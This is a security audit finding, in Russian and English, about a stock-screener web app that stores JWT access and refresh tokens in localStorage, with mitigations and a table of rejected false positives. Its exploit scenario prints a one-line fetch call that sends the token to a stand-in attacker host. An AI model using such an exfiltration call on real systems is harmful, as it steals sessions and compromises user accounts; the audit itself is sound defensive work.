## Vulnerability 1 — JWT Tokens в localStorage

**File:** `artifacts/stockscreener/src/hooks/use-auth.tsx` (lines 32–82)  
**Severity:** HIGH  
**Category:** Insecure Credential Storage  
**Confidence:** 9/10

### Description

Оба токена (access token и refresh token) хранятся в `localStorage` в открытом виде:

```typescript
const TOKEN_KEY = "tt_token";
const REFRESH_TOKEN_KEY = "tt_refresh_token";

localStorage.setItem(TOKEN_KEY, tokens.token);
localStorage.setItem(REFRESH_TOKEN_KEY, tokens.refreshToken);
setAuthTokenGetter(() => localStorage.getItem(TOKEN_KEY));
```

`localStorage` доступен любому JavaScript-коду на странице, включая скрипты из скомпрометированных npm-пакетов.

### Exploit Scenario

1. Любая XSS-уязвимость в зависимости (Recharts, Framer Motion, Radix UI и др.) выполняет:
   ```js
   fetch("https://attacker.com?" + localStorage.getItem("tt_token"))
   ```
2. Атакующий получает оба токена
3. Refresh token позволяет бесконечно продлевать сессию → аккаунт пользователя скомпрометирован навсегда

**Дополнительно:** в `chart.tsx:79` используется `dangerouslySetInnerHTML` — хотя сейчас это только developer-config CSS, это подтверждает, что XSS-вектор в приложении потенциально существует.

### Mitigation

**Рекомендованное решение (долгосрочное):** переместить токены в `HttpOnly; Secure; SameSite=Strict` cookies — тогда JavaScript вообще не имеет доступа к токенам.

**Краткосрочный fix для MVP:** заменить `localStorage` на `sessionStorage` — токены будут удалены при закрытии вкладки, что существенно снижает окно атаки:

```typescript
// Вместо localStorage.setItem(...)
sessionStorage.setItem(TOKEN_KEY, tokens.token);
sessionStorage.setItem(REFRESH_TOKEN_KEY, tokens.refreshToken);
```

**Также рекомендую:**
- Добавить `Content-Security-Policy` заголовок на бэкенде/CDN
- Установить короткое TTL для access token (15 мин) и разумное — для refresh token (7 дней)

## False Positives — Отклонено

Следующие паттерны были проверены и признаны не уязвимостями:

| Подозрение | Вердикт | Причина |
|-----------|---------|---------|
| Hardcoded API URL в `main.tsx:8` | Не уязвимость | API URL виден в Network DevTools в любом случае; URL — не секрет |
| Unvalidated URLs в `ticker-detail.tsx` | Не уязвимость | Требует компрометации backend; backend несёт ответственность за валидацию |
| Client-side `user.id = "temp-id"` | Не уязвимость | JWT токен — реальный механизм auth; клиентский объект не влияет на backend |
| PII (email/name) в localStorage | Не самостоятельная уязвимость | Поглощается finding #1; пользователь сам знает свой email |
| `dangerouslySetInnerHTML` в `chart.tsx:79` | Не уязвимость | Только developer-config CSS-переменные, не user data |
